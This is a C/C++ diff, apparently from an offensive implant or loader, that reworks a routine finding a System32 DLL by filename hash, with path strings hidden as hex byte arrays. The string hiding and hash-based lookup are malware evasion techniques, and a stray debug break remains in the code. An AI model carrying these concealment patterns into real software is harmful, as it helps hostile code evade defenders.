@@ -5,11 +5,11 @@ using namespace Opsec;
 using namespace Utils;
 using namespace Memory::Methods;
 
-__attribute__((used, section(".rdata"))) uint8_t dot_dll[] = { 0x2e,0x64,0x6c,0x6c,0x00 };
+__attribute__((used, section(".rdata"))) uint8_t dot_dll[] = { 0x2a,0x00,0x2e,0x00,0x64,0x00,0x6c,0x00,0x6c,0x00,0x00 };
 __attribute__((used, section(".rdata"))) uint8_t sys32[] = {
-	0x43,0x3a,0x2f,0x57,0x69,0x6e,0x64,0x6f,0x77,0x73,0x2f,0x53,0x79,0x73,0x74,0x65,
-	0x6d,0x33,0x32,0x2f,0x2a,0x2e,0x64,0x6c,0x6c,0x00
-};
+	0x43,0x00,0x3a,0x00,0x2f,0x00,0x57,0x00,0x69,0x00,0x6e,0x00,0x64,0x00,0x6f,0x00,
+	0x77,0x00,0x73,0x00,0x2f,0x00,0x53,0x00,0x79,0x00,0x73,0x00,0x74,0x00,0x65,0x00,
+	0x6d,0x00,0x33,0x00,0x32,0x00,0x2f,0x00,0x00 };
 
 namespace Modules {
 
@@ -651,29 +651,31 @@ namespace Modules {
             goto defer;
         }
 
-		MbsToWcs(filename, (char*)sys32, MbsLength((char*)sys32));
+		__debugbreak();
+		MemCopy(filename, sys32, sizeof(sys32));
+		WcsConcat(filename, (wchar_t*)dot_dll);
 
 		handle = ctx->win32.FindFirstFileW(filename, &data);
 		if (INVALID_HANDLE_VALUE == handle) {
 			goto defer;
 		}
 
-		MemSet(filename, 0, MAX_PATH);
 		do {
 			if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
 				continue;
 			} else {
 				if (HashStringW(data.cFileName, WcsLength(data.cFileName)) - name_hash == 0) {
+					MemSet(filename, 0, MAX_PATH);
 					MemCopy(filename, data.cFileName, WcsLength(data.cFileName) * sizeof(wchar_t));
 				}
 			}
 		} while (ctx->win32.FindNextFileW(handle, &data) != 0);
 
-		__debugbreak();
 		if (!filename[0]) {
 			goto defer;
 		}
 
+		MemCopy(module->local_name, (char*)sys32, sizeof(sys32));
 		WcsConcat(module->local_name, filename);
 
         module->cracked_name = (wchar_t*) Malloc(WcsLength(filename) * sizeof(wchar_t) + 1);
